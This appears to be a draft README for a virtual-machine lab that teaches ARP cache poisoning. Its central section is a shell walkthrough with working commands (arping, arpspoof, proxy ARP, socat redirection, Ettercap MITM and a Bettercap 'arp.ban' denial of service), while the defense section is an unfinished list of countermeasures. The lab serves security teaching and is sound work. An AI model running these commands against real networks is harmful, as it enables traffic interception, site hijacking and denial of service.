# Performing and Detecting an ARP Cache Poisoning Attack

Solidify your understanding of the data-link layer (OSI Layer 2) in this exercise that will walk you through the process of performing a classic ARP spoofing attack, a fundamental NetSec technique that is still used in many real-life hacking scenarios today.

Before there was “The Internet,” there was [Ethernet](https://simple.wikipedia.org/wiki/Ethernet). First developed in the mid 1970’s, Ethernet takes its name from the erroneous belief first postulated in the late 19<sup>th</sup> century that an omnipresent yet invisible material known as “ether” permeated everything and everyone. Today, in a kind of self-fulfilling prophecy, ethernet is the near-ubiquitous link-layer networking technology that underpins almost every modern telecommunications network.

By examining Ethernet network frames, we will see how Internet communications, such as data sent to one IP address or another, is carried from one physical device to another, thus traversing “the ether.” This process is facilitated by the [Address Resolution Protocol (ARP)](https://simple.wikipedia.org/wiki/Address_Resolution_Protocol), a simple mechanism that maps IP addresses to hardware device addresses. But ARP has a fundamental flaw: its own messages cannot be authenticated.

This lack of authentication can be exploited for both legitimate and illegitmate purposes, allowing for increased resiliency, or enabling a malicious attacker to pretend to be someone that they are not. In this latter case, an attacker can perform network-based Denial-of-Service (DOS) or Machine-in-the-Middle (MITM) attacks regardless of whether or not some higher-level encryption (like Wi-Fi passwords) is used. By performing what is known as an ARP cache poisoning attack, attackers are able to masquerade as any other device on “the ethernet.” This exercise will demonstrate how this attack works and what you can do to detect, prevent, and remediate such attacks on your networks.

# Contents

1. [Objectives](#objectives)
1. [Bill of materials](#bill-of-materials)
1. [Prerequisites](#prerequisites)
1. [Set up](#set-up)
1. [Practice](#practice)
    1. [Introduction](#introduction)
    1. [Defending against ARP cache poisoning attacks](#defending-against-arp-cache-poisoning-attacks)
1. [Discussion](#discussion)
1. [Additional references](#additional-references)

# Objectives

> :construction: TK-TODO

# Bill of materials

This folder contains the following files and folders:

* `Blue Team/` - Provisioning files for the defender's assets, including:
    * `AnarchoTechNYC-BlueTeam.png` - Emblem used as the default desktop background image for Blue Team machines.
    * `server/` - Provisioning configurations for the Blue Team's server.
        * `python-simplehttpserver.service` - Service unit file to run a Python HTTP server.
        * `www/` - Web server document root containing static HTML pages for demo purposes.
* `README.md` - This file.
* `Red Team/` - Provisioning files for the attacker's assest, including:
    * `AnarchoTechNYC-BlueTeam.png` - Emblem used as the default desktop background image for Red Team machines.
* `Vagrantfile`

# Prerequisites

To perform this lab, you must have:

* A computer running any modern version of:
    * Windows,
    * macOS,
    * FreeBSD,
    * Solaris, or
    * any flavor of the GNU/Linux operating system.
* An active Internet connection (for downloading the required tools in the [set up](#set-up) step, as well as Vagrant base boxes, and the required software packages into the virtual machines; you do not need an Internet connection once you have completed the set up portion of this lab).

> :beginner: :computer: This exercise requires the use of a command line, or "terminal." If you don't know what that means, or if you do but you feel intimidated by that, consider going through [Tech Learning Collective&rsquo;s free, online and self-paced *Foundations: Command Line Basics* course](https://techlearningcollective.com/foundations/), spending an hour at [Apple's Terminal User Guide](https://support.apple.com/guide/terminal/) (for macOS users), [Ubuntu's Command Line for Beginners tutorial](https://ubuntu.com/tutorials/command-line-for-beginners) (for GNU/Linux users) or reviewing [Computer Hope's article, "How to use the Windows command line (DOS)"](http://www.computerhope.com/issues/chusedos.htm) (for Windows users) if you want to get started quickly. You don't need to complete the whole tutorial or article to understand this exercise, but it will dramatically improve your comprehension of this exercise's mechanics. If you want a more thorough but equally gentle introduction to the same material, consider reading (and listening to) [Taming the Terminal](https://www.bartbusschots.ie/s/blog/taming-the-terminal/).

# Set up

In addition to your laptop or desktop computer, you will need to acquire the following tools.

* For managing the virtual machines: [VirtualBox](https://www.virtualbox.org/) version 6.1 or newer, sometimes written as *VBox*.
* For automatically configuring virtual machine settings: [Vagrant](https://vagrantup.com/) version 2.2.7 or newer.

Complete the [Introduction to Virtual Machine Management with Vagrant](../introduction-to-virtual-machine-management-with-vagrant/README.md) practice lab before this one if you do not yet have VirtualBox and Vagrant installed or are unfamiliar with how to use them.

Then, bring the virtual machine(s) for the lab online.

**Do this:**

1. Boot both virtual machines needed for the lab:
    ```sh
    vagrant up
    ```

Once all the virtual machines are running, you can continue to the next step.

# Practice

We'll begin by ensuring you have successfully completed the [set up](#set-up) steps. This process will also introduce the fundamentals that you need to understand to complete the rest of the exercise.

## Introduction

> :construction: TK-TODO

## Performing an ARP cache poisoning attack

In this exercise we will pretend to be a machine on the LAN that we are not by lying about the IP address we were given by the LAN's DHCP server. This will enable us to arbitrarily redirect local network traffic to any machine we wish, including ourselves, such that we can perform network-based Denial-of-Service (DOS) or Machine-in-the-Middle (MITM) attacks. We will accomplish this by exploiting the lack of peer authentication in the Address Resolution Protocol (ARP), which maps an ethernet device's MAC address to its IP address.

Essentially, we will be performing an *ARP spoofing* attack. As this behavior is relatively conspicuous, we will also cover the basics of *MAC address spoofing*, which will assign a fake hardware address to the NIC you will use to emit spoofed ARP replies to the network. This combination of MAC and ARP spoofing enables you to masquerade as any other device on the local network segment.

> :construction: TK-TODO: This whole section is still just notes.

A demo of performing an ARP cache poisoning attack.

Don't forget to spoof your own hardware address first:

* [SimpleSpoofMAC](https://github.com/meitar/SimpleSpoofMAC)

```sh
# Some assumptions for this demo:
VICTIM_IP=192.168.9.10
VICTIM_mDNS=server.local
INTERFACE=en0

# Make a temporary directory to store our spoofed site.
mkdir /tmp/hijack
cd !$ # Go there.

# Place an `index.html` file in the directory that will be the
# HTTP server's document root.
echo "Expecting a local server? Surprise! It's been hijacked by an ARP cache poisoning attack." > index.html

# Start an HTTP server on port 8000 (the default).
python3 -m http.server &

# Become a `sudo`'er so that we can bind to privileged ports.
su admin

# Redirect port 80 traffic to our HTTP server on localhost.
sudo socat TCP4-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8000

# Find the IP address of the device we are going to impersonate.
dns-sd -G v4 $VICTIM_mDNS # Resolve (via mDNS) the server's domain name.
# GNU/Linux users will probably want to do:
#avahi-resolve --name -4 $VICTIM_mDNS

# Alias our own NIC to the IP address that we want to masquerade as.
# NOTE: This is not necessary for an MITM, since we just need to pass
# traffic back and forth between our two targets. However, as this is
# demos a *hijack* rather than an MITM, we need to respond *as* the
# target instead of passing traffic *to* the target.
sudo ifconfig $INTERFACE ${VICTIM_IP}/24 alias
# GNU/Linux users will probably want to do this instead:
#ip address add ${VICTIM_IP}/24 dev $INTERFACE

# Now that we know the server's IP address, let's note its MAC address.
# If it responds to ICMP echo requests, `ping` will show us output:
ping $VICTIM_IP

# If it doesn't, we can do an ARP scan instead. There are many tools, but I
# like using `nmap`; its `-sn` option will do only a host discovery scan.
sudo nmap -sn -PR $VICTIM_IP # Note `-PR` is default, so can be omitted.

# An alternative tool that provides more output is `arp-scan`.
arp-scan $VICTIM_IP

# We can also use the `arping` utility for a more surgical approach:
sudo arping -c 1 -i $INTERFACE $VICTIM_IP

# We should now have an entry in our local ARP table ("ARP cache"):
arp -n $VICTIM_IP
# GNU/Linux users will probably want to do this instead:
#ip neighbour show $VICTIM_IP

# To actually perform the attack (i.e., to lie about the MAC-to-IP
# mapping to the network), we can configure our attack machine to
# respond to ARP requests for the victim IP address with our own
# NIC's MAC address. This will not *necessarily* work due to the fact
# that the legitimate answer may come after our own, overriding it.
sudo arp -s $VICTIM_IP auto pub only ifscope $INTERFACE

# NOTE: This is only currently easy on true UNIX, like BSD. Attempts
# to publish a Proxy ARP entry on GNU/Linux requires a kernel tunable
# (`net.ipv4.conf.${INTERFACE}.proxy_arp`) and proper routing tables.
# If you really want to attempt this as a GNU/Linux user, you will
# ulimately want to invoke a command such as the following after setting
# up your IP routing tables appropriately. ("Appropriately" means what?)
# Some guidance at http://linux-ip.net/html/tools-ip-neighbor.html
#sudo arp -Ds $VICTIM_IP $INTERFACE pub

# To improve the liklihood of successfully poisoning the target's ARP cache,
# we want to continuously broadcast the wrong information, repeatedly.
# The "wrong information" means an ARP packet whose payload contains:
#
# * The `Sender MAC address` field set to the MAC address of the attacker.
# * The `Sender IP address` field set to the IP address of the target.
# * The `Target MAC address` field set to the broadcast MAC address.
# * The `Target IP address` field set to 0.0.0.0.
#
# This should be sent as an ARP reply (opcode `0x02`).
#
# What this does is tell devices that the IP address of the target is
# associated with the MAC address of the attacker; hence, ARP spoofing.

# One way we could construct such an ARP packet manually is like so:
sudo arping -i $INTERFACE -U -P -S $VICTIM_IP 0.0.0.0

# More simply, we can just use the `arpspoof` tool:
arpspoof $VICTIM_IP
```

> Automate portions of the above with tooling. Ettercap and Bettercap are the famous tools for this:
> 
> * Old demo of Ettercap's `remote_browser` plugin:
>     1. Make sure you have an appropriately configured `etter.conf`:
>         * Set `ec_uid` and `ec_gid` to user ID and group ID number you want Ettercap to become, e.g., `ec_uid = 1000`
>         * Set `remote_browser` to a command that makes sense, such as opening your Web browser, e.g., `remote_browser = "sudo -u vagrant xdg-open http://%host%url"`
>     1. Launch Ettercap in `--text` interface mode, performing an ARP MITM attack that also snarfs packets bound for remote networks (`--mitm arp:remote`) with the `--plugin` for the `remote_browser` activated and a chosen target:
>         ```sh
>         # Targets are specified as `[MAC address]/[IPv4 range]/[IPv6 range]/[port range]`
>         # The three delimiting slashes are required, the values are not. A missing value means "any."
>         # If `ettercap` complains about the "wrong number" of slashes (`/`), you may have
>         # a copy that does not have IPv6 support. See `ettercap -h | grep ^TARGET` to check target syntax.
>         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /172.22.33.50// /172.22.33.10//80
>         ```
> * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that prevents a device from accessing the Internet:
>     1. Launch `bettercap` with `sudo bettercap`
>     1. Find a target: `net.show`
>     1. Set the target (otherwise, entire subnet is the target): `set arp.spoof.targets 192.168.9.10-50`
>     1. Activate the ARP ban hammer: `arp.ban on`
>     1. End the attack: `arp.ban off`

## Defending against ARP cache poisoning attacks

> :construction: TK-TODO
>
> Static ARP binding, the old-school `ethers(5)` file, `arptables(8)`, the [`arpon` utility](https://en.wikipedia.org/wiki/ArpON), various [GNU/Linux kernel tunables](https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt) (`arp_*`), `arpwatch`, `arping -d`, etc.

# Discussion

> :construction: TK-TODO

# Additional references

* [ARP Cache Poisoning](https://www.grc.com/nat/arp.htm)
